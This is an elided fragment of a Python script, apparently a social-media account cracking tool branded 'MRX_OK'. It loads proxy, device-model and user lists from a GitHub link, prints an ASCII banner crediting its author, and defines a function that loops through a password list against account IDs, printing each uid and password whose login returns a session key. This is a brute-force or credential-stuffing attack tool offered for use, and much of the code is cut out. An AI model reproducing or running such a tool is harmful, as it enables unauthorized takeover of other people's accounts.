...
try:
	prox= requests.get('https://github.com/Mrx-Jibon/MRX_OK/blob/main/MRX_OK.txt').text
...
android_models=[]
try:
	xx = requests.get('https://github.com/Mrx-Jibon/MRX_OK/blob/main/MRX_OK.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://github.com/Mrx-Jibon/MRX_OK/blob/main/MRX_OK.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
...
logo=("""\033[1;91m
        \033[1;97m oooo ooooo oooooooooo.    .oooooo.   ooooo      ooo  
       \033[1;97m  `888 `888' `888'   `Y8b  d8P'  `Y8b  `888b.     `8'     
        \033[1;97m  888  888   888     888 888      888  8 `88b.    8     
        \033[1;97m  888  888   888oooo888' 888      888  8   `88b.  8     
        \033[1;97m  888  888   888    `88b 888      888  8     `88b.8     
         \033[1;97m 888  888   888    .88P `88b    d88'  8       `888     
     \033[1;97m .o. 88P o888o o888bood8P'   `Y8bood8P'  o8o        `8     
    \033[1;97m  `Y888P\033[1;32m       MRX
\033[1;37m--------------------------------------------------
[~] Author   : Jibon Sarker
...
def MRX2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [MRX-OK] '+udx+' | '+pas+'\033[1;97m')
